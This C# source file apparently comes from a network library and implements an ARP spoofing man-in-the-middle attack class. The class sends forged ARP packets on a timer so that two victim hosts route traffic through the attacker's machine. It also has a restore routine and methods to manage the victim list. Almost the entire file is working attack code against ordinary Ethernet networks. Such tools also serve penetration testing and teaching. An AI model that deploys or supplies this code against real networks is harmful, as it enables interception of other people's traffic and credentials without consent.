using System;
using System.Collections.Generic;
using System.Text;
using System.Net;
using eExNetworkLibrary.IP;
using System.Timers;
using eExNetworkLibrary.Utilities;
using eExNetworkLibrary.Ethernet;
using eExNetworkLibrary.ARP;
using eExNetworkLibrary.Monitoring;

namespace eExNetworkLibrary.Attacks.Spoofing
{
    /// <summary>
    /// This class is capable of initiating an ARP poison routing attack by spoofing ARP packets
    /// This class also includes its own MAC address analyzing component
    /// </summary>
    public class APRAttack : DirectInterfaceIOHandler, eExNetworkLibrary.Attacks.IMITMAttack
    {
        private List<MITMAttackEntry> lVictims;
        private int iPoisonInterval;
        private Timer tTimer;
        private bool bArpRunning;
        private APRAttackMethod aprMethod;

        /// <summary>
        /// This delegate represents the method which handles ARP attack entry events.
        /// </summary>
        /// <param name="sender">The object which fired the event</param>
        /// <param name="arpChanged">The event arguments</param>
        public delegate void APRAttackEntryStatusChanged(object sender, MITMAttackEntry arpChanged);

        /// <summary>
        /// This event is fired whenever the status of an ARP attack entry has changed
        /// </summary>
        public event APRAttackEntryStatusChanged OnAttackEntryStatusChanged;

        /// <summary>
        /// This event is fired when poisened ARP packets are sent
        /// </summary>
        public event EventHandler Poisoned;

        /// <summary>
        /// Gets or sets the interval at which spoofed ARP packets should be sent in milliseconds
        /// </summary>
        public int SpoofInterval
        {
            set
            {
                iPoisonInterval = value;
                tTimer.Interval = iPoisonInterval;
                InvokePropertyChanged();
            }
            get { return iPoisonInterval; }
        }

        /// <summary>
        /// Gets a bool inidicating whether a APR attack is currently running
        /// </summary>
        public bool AttackRunning
        {
            get { return bArpRunning; }
        }

        /// <summary>
        /// Throws an exception since APR attacks only generate traffic
        /// </summary>
        /// <param name="fInputFrame">The frame to handle</param>
        protected override void  HandleTraffic(Frame fInputFrame)
        {
            throw new InvalidOperationException("APR attacks are not capable of handling traffic");
        }

        /// <summary>
        /// Setting output handlers is not supported by APR attacks
        /// </summary>
        public override TrafficHandler OutputHandler
        {
            get { return this; }
            set { throw new InvalidOperationException("Traffic analyzers must not have any output"); }
        }

        /// <summary>
        /// Gets or sets the APR attack method
        /// </summary>
        public APRAttackMethod Method
        {
            get { return aprMethod; }
            set
            {
                aprMethod = value;
                InvokePropertyChanged();
            }
        }

        /// <summary>
        /// Creates a new instance of this class
        /// </summary>
        public APRAttack()
        {
            iPoisonInterval = 1500;
            lVictims = new List<MITMAttackEntry>();
            tTimer = new Timer();
            tTimer.Interval = iPoisonInterval;
            tTimer.AutoReset = true;
            tTimer.Elapsed += new ElapsedEventHandler(tTimer_Elapsed);
            bArpRunning = false;
            aprMethod = APRAttackMethod.UseReplyPackets;
        }

        void tTimer_Elapsed(object sender, ElapsedEventArgs e)
        {
            Poison();
        }

        private void Antidote()
        {
            EthernetFrame ethFrame;
            ARPFrame arpFrame;

            lock (lVictims)
            {
                foreach (EthernetInterface ipi in lInterfaces)
                {
                    foreach (MITMAttackEntry aprVictim in lVictims)
                    {
                        if (!ipi.ARPTable.Contains(aprVictim.VictimBob) || !ipi.ARPTable.Contains(aprVictim.VictimAlice))
                        {
                            continue;
                        }
                        //Poisoning Victim 1

                        ethFrame = new EthernetFrame();
                        ethFrame.CanocialFormatIndicator = false;
                        ethFrame.Destination = ipi.ARPTable.GetEntry(aprVictim.VictimBob).MAC;
                        ethFrame.Source = ipi.ARPTable.GetEntry(aprVictim.VictimAlice).MAC;
                        ethFrame.VlanTagExists = false;
                        ethFrame.EtherType = EtherType.ARP;

                        arpFrame = new ARPFrame();
                        arpFrame.DestinationIP = aprVictim.VictimBob;

                        if (aprMethod == APRAttackMethod.UseRequestPackets)
                        {
                            arpFrame.DestinationMAC = MACAddress.Parse("00:00:00:00:00:00");
                        }
                        else
                        {
                            arpFrame.DestinationMAC = ipi.ARPTable.GetEntry(aprVictim.VictimBob).MAC;
                        }

                        arpFrame.SourceIP = aprVictim.VictimAlice;
                        arpFrame.SourceMAC = ipi.ARPTable.GetEntry(aprVictim.VictimAlice).MAC;
                        arpFrame.ProtocolAddressType = EtherType.IPv4;
                        arpFrame.HardwareAddressType = HardwareAddressType.Ethernet;

                        if (aprMethod == APRAttackMethod.UseRequestPackets)
                        {
                            arpFrame.Operation = ARPOperation.Request;
                        }
                        else
                        {
                            arpFrame.Operation = ARPOperation.Reply;
                        }

                        ethFrame.EncapsulatedFrame = arpFrame;

                        ipi.Send(ethFrame);

                        //Poisoning Victim 2

                        ethFrame = new EthernetFrame();
                        ethFrame.CanocialFormatIndicator = false;
                        ethFrame.Destination = ipi.ARPTable.GetEntry(aprVictim.VictimAlice).MAC;
                        ethFrame.Source = ipi.ARPTable.GetEntry(aprVictim.VictimBob).MAC;
                        ethFrame.VlanTagExists = false;
                        ethFrame.EtherType = EtherType.ARP;

                        arpFrame = new ARPFrame();
                        arpFrame.DestinationIP = aprVictim.VictimAlice;

                        if (aprMethod == APRAttackMethod.UseRequestPackets)
                        {
                            arpFrame.DestinationMAC = MACAddress.Parse("00:00:00:00:00:00");
                        }
                        else
                        {
                            arpFrame.DestinationMAC = ipi.ARPTable.GetEntry(aprVictim.VictimAlice).MAC;
                        }

                        arpFrame.SourceIP = aprVictim.VictimBob;
                        arpFrame.SourceMAC = ipi.ARPTable.GetEntry(aprVictim.VictimBob).MAC;
                        arpFrame.ProtocolAddressType = EtherType.IPv4;
                        arpFrame.HardwareAddressType = HardwareAddressType.Ethernet;

                        if (aprMethod == APRAttackMethod.UseRequestPackets)
                        {
                            arpFrame.Operation = ARPOperation.Request;
                        }
                        else
                        {
                            arpFrame.Operation = ARPOperation.Reply;
                        }

                        ethFrame.EncapsulatedFrame = arpFrame;

                        ipi.Send(ethFrame);
                    }
                }
            }
        }

        private void Poison()
        {
            EthernetFrame ethFrame;
            ARPFrame arpFrame;

            lock (lVictims)
            {
                foreach (EthernetInterface ipi in lInterfaces)
                {
                    foreach (MITMAttackEntry aprVictim in lVictims)
                    {
                        if (!ipi.ARPTable.Contains(aprVictim.VictimBob) || !ipi.ARPTable.Contains(aprVictim.VictimAlice))
                        {
                            continue;
                        }

                        //Poisoning Victim 1

                        ethFrame = new EthernetFrame();
                        ethFrame.CanocialFormatIndicator = false;
                        ethFrame.Destination = ipi.ARPTable.GetEntry(aprVictim.VictimBob).MAC;
                        ethFrame.Source = ipi.PrimaryMACAddress;
                        ethFrame.VlanTagExists = false;
                        ethFrame.EtherType = EtherType.ARP;

                        arpFrame = new ARPFrame();
                        arpFrame.DestinationIP = aprVictim.VictimBob;

                        if (aprMethod == APRAttackMethod.UseRequestPackets)
                        {
                            arpFrame.DestinationMAC = MACAddress.Parse("00:00:00:00:00:00");
                        }
                        else
                        {
                            arpFrame.DestinationMAC = ipi.ARPTable.GetEntry(aprVictim.VictimBob).MAC;
                        }

                        arpFrame.SourceIP = aprVictim.VictimAlice;
                        arpFrame.SourceMAC = ipi.PrimaryMACAddress;
                        arpFrame.ProtocolAddressType = EtherType.IPv4;
                        arpFrame.HardwareAddressType = HardwareAddressType.Ethernet;

                        if (aprMethod == APRAttackMethod.UseRequestPackets)
                        {
                            arpFrame.Operation = ARPOperation.Request;
                        }
                        else
                        {
                            arpFrame.Operation = ARPOperation.Reply;
                        }

                        ethFrame.EncapsulatedFrame = arpFrame;

                        ipi.Send(ethFrame);

                        //Poisoning Victim 2

                        ethFrame = new EthernetFrame();
                        ethFrame.CanocialFormatIndicator = false;
                        ethFrame.Destination = ipi.ARPTable.GetEntry(aprVictim.VictimAlice).MAC;
                        ethFrame.Source = ipi.PrimaryMACAddress;
                        ethFrame.VlanTagExists = false;
                        ethFrame.EtherType = EtherType.ARP;

                        arpFrame = new ARPFrame();
                        arpFrame.DestinationIP = aprVictim.VictimAlice;

                        if (aprMethod == APRAttackMethod.UseRequestPackets)
                        {
                            arpFrame.DestinationMAC = MACAddress.Parse("00:00:00:00:00:00");
                        }
                        else
                        {
                            arpFrame.DestinationMAC = ipi.ARPTable.GetEntry(aprVictim.VictimAlice).MAC;
                        }

                        arpFrame.SourceIP = aprVictim.VictimBob;
                        arpFrame.SourceMAC = ipi.PrimaryMACAddress;
                        arpFrame.ProtocolAddressType = EtherType.IPv4;
                        arpFrame.HardwareAddressType = HardwareAddressType.Ethernet;

                        if (aprMethod == APRAttackMethod.UseRequestPackets)
                        {
                            arpFrame.Operation = ARPOperation.Request;
                        }
                        else
                        {
                            arpFrame.Operation = ARPOperation.Reply;
                        }

                        ethFrame.EncapsulatedFrame = arpFrame;

                        ipi.Send(ethFrame);
                    }
                }
            }
            InvokePoisoned();
        }

        private void InvokeStatusChange(MITMAttackEntry aprEntry)
        {
            InvokeExternalAsync(this.OnAttackEntryStatusChanged, aprEntry);
        }

        /// <summary>
        /// Adds an MITM Attack Entry to this MITM Attack. Adding victims not in direct connected subnets or not present in the interface's ARP-table will be without any effect. 
        /// To avoid the last situation, it is wise to run an ARP scan first on the subnet to attack.
        /// </summary>
        /// <param name="apreVicim">The victims to add to this attack.</param>
        public void AddToVictimList(MITMAttackEntry apreVicim)
        {
            lVictims.Add(apreVicim);
            InvokeStatusChange(apreVicim);
        }

        /// <summary>
        /// Removes a man in the middle attack entry from the victim list of this attack
        /// </summary>
        /// <param name="apreVicim">The man in the middle attack entry to remove</param>
        public void RemoveFromVictimList(MITMAttackEntry apreVicim)
        {
            lVictims.Remove(apreVicim);
        }

        /// <summary>
        /// Checks whether a specific man in the middle attack entry is contained in this attack
        /// </summary>
        /// <param name="apreVicim">A specific man in the middle attack entry</param>
        /// <returns>A bool indicating whether a specific man in the middle attack entry is contained in this attack</returns>
        public bool VictimListContains(MITMAttackEntry apreVicim)
        {
            return lVictims.Contains(apreVicim);
        }

        /// <summary>
        /// Clears the victim list
        /// </summary>
        public void ClearVictimList()
        {
            lVictims.Clear();
        }

        /// <summary>
        /// Returns all man in the middle attack entries of this attack's victim list
        /// </summary>
        /// <returns></returns>
        public MITMAttackEntry[] GetVictims()
        {
            return lVictims.ToArray();
        }

        /// <summary>
        /// Starts this attack
        /// </summary>
        public override void Start()
        {
            bArpRunning = true;
            Poison();
            tTimer.Enabled = true;
            base.Start();
        }

        /// <summary>
        /// Stops this attack and restores the ARP tables of the attacked hosts, which causes the traffic flow not to interrupt
        /// </summary>
        public override void Cleanup()
        {
            bArpRunning = false;
            tTimer.Enabled = false;
            tTimer.Dispose();
            Antidote();
            base.Cleanup();
        }

        /// <summary>
        /// Stops thist traffic handler 
        /// </summary>
        public override void Stop()
        {
            base.Stop();
        }

        /// <summary>
        /// Rises the poisoned event
        /// </summary>
        protected void InvokePoisoned()
        {
            InvokeExternalAsync(Poisoned);
        }

        /// <summary>
        /// Adds an interface to this APR attack
        /// </summary>
        /// <param name="ipInterface">The IP interface to add. This interface has to be an ethernet interface.</param>
        public override void AddInterface(IPInterface ipInterface)
        {
            if (ipInterface.GetType() != typeof(EthernetInterface))
            {
                throw new ArgumentException("Only ethernet interfaces are supported for ARP spoofing MITM attack");
            }
            base.AddInterface(ipInterface);
        }

        /// <summary>
        /// Pauses the attack until ResumeAttack() is called and restores the ARP tables of the victims.
        /// </summary>
        public void PauseAttack()
        {
            bArpRunning = false;
            tTimer.Enabled = false;
            Antidote();
        }

        /// <summary>
        /// Resumes the attack which was suspended when PauseAttack() was called.
        /// </summary>
        public void ResumeAttack()
        {
            bArpRunning = true;
            tTimer.Enabled = true;
        }
    }

    /// <summary>
    /// An enumeration for APR attack methods
    /// </summary>
    public enum APRAttackMethod
    {
        /// <summary>
        /// Use reply packets
        /// </summary>
        UseReplyPackets = 0,
        /// <summary>
        /// Use request packets. This method will cause more traffic since each request packet will be answered
        /// </summary>
        UseRequestPackets = 1
    }
}
